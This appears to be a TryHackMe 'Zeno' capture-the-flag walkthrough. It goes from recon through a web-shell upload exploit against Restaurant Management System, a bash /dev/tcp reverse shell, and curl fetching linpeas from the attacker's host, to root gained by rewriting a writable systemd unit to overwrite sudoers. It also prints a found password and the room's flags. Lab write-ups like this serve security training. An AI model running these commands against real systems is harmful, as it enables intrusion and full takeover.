# Zeno TMS Walkthrough
### Link
- https://tryhackme.com/room/zeno
---
### Recon
```
sudo nmap -p- -sS -Pn -n [IP]
```
**Namp scan result**
```
```
---
### Enumeration
```
sudo gobuster dir -u http://[IP] -w ~/[PATH]/directory-list-2.3-small.txt
```
**result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.63.84:12340
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/12 20:04:14 Starting gobuster in directory enumeration mode
===============================================================
/rms                  (Status: 301) [Size: 237] [--> http://10.10.63.84:12340/rms/]
```
Let's check the directory **/rms**. We directly arrive to the main page of a restaurant.

After a quick check on this page, we can find the framework used to build it:  Restaurant Management System
---
### Exploitation

Let's check **exploit-db** : [Link](https://www.exploit-db.com/exploits/47520)

When I tried to launch the script, I received a beautiful error message ^^
```
File "/Users/laurentnebout/Documents/LOLO_Share/THM/47520.py", line 40
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)
                                                                     ^
SyntaxError: EOL while scanning string literal
```
Ok, let's check the script.
```
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)
Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;
boundary=---------------------------191691572411478",
    "Connection": "close",
	"Referer": "http://localhost:8081/rms/admin/foods.php",
	"Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
	"Upgrade-Insecure-Requests": "1"

}
```
That is an issue with the **hearder** format. Let's update it.
```
headers = {
 40     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
 41     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 42     "Accept-Language": "en-US,en;q=0.5",
 43     "Accept-Encoding": "gzip, deflate",
 44     "Content-Length": "327",
 45     "Content-Type": "multipart/form-data; boundary=---------------------------191691572411478",
 46     "Connection": "close",
 47     "Referer": "http://localhost:8081/rms/admin/foods.php",
 48     "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
 49     "Upgrade-Insecure-Requests": "1"
 50
 51 }
```

One more time, another error.
```
  File "/Users/laurentnebout/Documents/LOLO_Share/THM/47520.py", line 70
    print("[+] Shell Uploaded. Please check the URL :
                                                     ^
SyntaxError: EOL while scanning string literal
```
Let's check this line
```
print("[+] Shell Uploaded. Please check the URL :
"+url+"images/reverse-shell.php")
```
Also, comment the **proxy** and update the format here too.
```
r = requests.post(target,verify=False, headers=headers,data=data)
#proxies={"http":"http://127.0.0.1:8080"})
```
Another format issue ^^; The appropriate format:
```
print("[+] Shell Uploaded. Please check the URL :"+url+"images/reverse-shell.php")
```
Let's launch the script
```
python3 ./usr/share/exploitdb/exploits/php/webapps/47520.py http://10.10.141.50:12340/rms/

    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|



Credits : All InfoSec (Raja Ji's) Group
[+] Restaurant Management System Exploit, Uploading Shell
[+] Shell Uploaded. Please check the URL :http://10.10.141.50:12340/rms/images/reverse-shell.php
```
Try the RCE
```
http://10.10.141.50:12340/rms/images/reverse-shell.php?cmd=id
```
Result
```
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 
```
OK, it works ^^. The next step is to create a reverse shell.

I draft this command
```
http://[IP targeted machiane]:12340/rms/images/reverse-shell.php?cmd=bash+-i+%3E%26+/dev/tcp/[IP local machine]/[PORT local machine listener]+0%3E%261
```
Listener into the local machine
```
 nc -nvlp 4646
Connection from 10.10.141.50:49868
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
bash-4.2$
```
Create a local websever and download **linpeas.sh**
```
bash-4.2$ curl http://10.6.96.167:8000/linpeas.sh > linpeas.sh
curl http://10.6.96.167:8000/linpeas.sh > linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  619k  100  619k    0     0   558k      0  0:00:01  0:00:01 --:--:--  559k
```
Change **linpeas.sh** rights and launch it
```
bash-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
bash-4.2$ ./linpeas.sh
```
```
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/systemd/system/zeno-monitoring.service

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft	0 0
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No
```
We have a **username** --> **zeno** and a **password** --> **FrobjoodAdkoonceanJa**

But, when I tried this combination, it doesn't work. So I checked the **linpeas.sh** result and I noticed that
```
╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/edward
/home/edward/.bash_logout
/home/edward/.bash_profile
/home/edward/.bashrc
/home/edward/user.txt
/home/edward/.viminfo
/home/edward/.bash_history
/home/edward/.ssh
/root/
```
I tried as **username** --> **edward** with the previous **password**
```
bash-4.2$ su edward
su edward
Password: FrobjoodAdkoonceanJa
whoami
edward
```
```
cd ~
ls
user.txt
cat user.txt
THM{070cab2c9dc622e5d25c0709f6cb0510}
```
**Question**
#### user.txt
**Answer** 
#### THM{070cab2c9dc622e5d25c0709f6cb0510}
---
### Privilege escalation
Before any other action , let's upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Let's check what I can do know
```
sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```
After a new **linpeas.sh**, I found that
```
ls -la /etc/systemd/system/zeno-monitoring.service
-rw-rw-rw-. 1 root root 141 Sep 21  2021 /etc/systemd/system/zeno-monitoring.service
```    
Edit the file
```
cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target
```
Update this script
```
[edward@zeno home]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

[Install]
WantedBy=multi-user.target
```
After that, we just need to reebot the machine
```
sudo /usr/sbin/reboot 
```
After the reboot
```
bash-4.2# whoami
root
```
```
bash-4.2# cat /root/root.txt
THM{b187ce4b85232599ca72708ebde71791}
```
**Question**
#### root.txt
**Answer** 
#### THM{b187ce4b85232599ca72708ebde71791}
